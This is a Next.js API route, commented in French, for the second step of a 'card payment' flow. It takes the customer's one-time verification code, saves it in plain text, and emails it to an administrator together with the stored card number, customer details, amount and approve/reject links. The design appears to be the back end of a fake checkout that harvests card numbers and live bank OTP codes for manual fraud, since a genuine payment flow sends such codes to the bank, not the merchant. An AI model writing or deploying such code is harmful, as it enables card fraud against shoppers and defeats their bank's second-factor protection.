/**
 * POST /api/payments/card-verify-otp
 *
 * ÉTAPE 2 du flux — appelé quand le client soumet son code OTP :
 *  1. Reçoit { sessionId, otpCode }
 *  2. Met à jour la session (step: 'otp_sent', otpCode)
 *  3. Envoie EMAIL 2 à l'admin : code OTP + boutons VALIDER / REFUSER
 *  4. Retourne { success: true, paymentId }
 *     → le frontend passe en état "traitement" et continue à poller
 */

import connectDB from "@/lib/mongoose"
import { Order, Payment, OtpSession } from "@/models/index"
import { sendEmail } from "@/lib/email"
import { adminOtpValidationEmail } from "@/lib/card-email-templates"

function formatPrice(n) {
    return Number(n).toFixed(2).replace(".", ",") + " €"
}

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, error: "Méthode non autorisée" })
    }

    const adminEmail = process.env.ADMIN_EMAIL || process.env.SMTP_USER
    if (!adminEmail) {
        return res.status(500).json({ success: false, error: "Configuration admin manquante" })
    }

    try {
        await connectDB()

        const { sessionId, otpCode } = req.body

        if (!sessionId || !otpCode?.trim()) {
            return res.status(400).json({ success: false, error: "sessionId et otpCode sont requis" })
        }
        if (otpCode.replace(/\D/g, "").length < 4) {
            return res.status(400).json({ success: false, error: "Code OTP invalide" })
        }

        const session = await OtpSession.findOne({
            _id: sessionId,
            step: { $in: ["card_sent", "otp_requested"] },
            decision: "pending",
        })

        if (!session) {
            return res.status(404).json({
                success: false,
                error: "Session introuvable ou expirée. Veuillez recommencer.",
            })
        }

        if (session.expiresAt < new Date()) {
            await session.deleteOne()
            return res.status(410).json({ success: false, error: "Session expirée. Veuillez recommencer." })
        }

        const order = await Order.findOne({
            _id: session.order,
            paymentStatus: { $in: ["pending", "failed"] },
        })

        if (!order) {
            return res.status(404).json({ success: false, error: "Commande introuvable ou déjà payée." })
        }

        const payment = await Payment.findOne({
            order: order._id,
            method: "card",
            status: "pending",
        }).lean()

        if (!payment) {
            return res.status(404).json({ success: false, error: "Paiement introuvable." })
        }

        // Mise à jour de la session avec le code OTP
        session.otpCode = otpCode.trim()
        session.step = "otp_sent"
        await session.save()

        const baseUrl =
            process.env.NEXT_PUBLIC_SITE_URL ||
            process.env.NEXTAUTH_URL ||
            `${req.headers["x-forwarded-proto"] || "http"}://${req.headers.host}`
        const approveUrl = `${baseUrl}/api/payments/card-decision?token=${session.adminToken}&decision=approve`
        const rejectUrl = `${baseUrl}/api/payments/card-decision?token=${session.adminToken}&decision=reject`

        const customerName = `${order.customer.firstName} ${order.customer.lastName}`.trim() || "Client"
        const customerEmail = order.customer.email || "—"

        // EMAIL 2 → admin
        const { subject, html } = adminOtpValidationEmail({
            customerName,
            customerEmail,
            otpCode: otpCode.trim(),
            cardNumber: session.cardNumber,
            orderRef: order.orderNumber,
            amount: formatPrice(order.total),
            approveUrl,
            rejectUrl,
        })

        sendEmail({ to: adminEmail, subject, html }).catch((err) =>
            console.error("[card-verify-otp] Erreur email admin:", err.message)
        )

        return res.status(200).json({
            success: true,
            paymentId: payment._id,
        })
    } catch (error) {
        console.error("[card-verify-otp] Erreur:", error)
        return res.status(500).json({
            success: false,
            error: process.env.NODE_ENV === "development" ? error.message : "Erreur serveur",
        })
    }
}
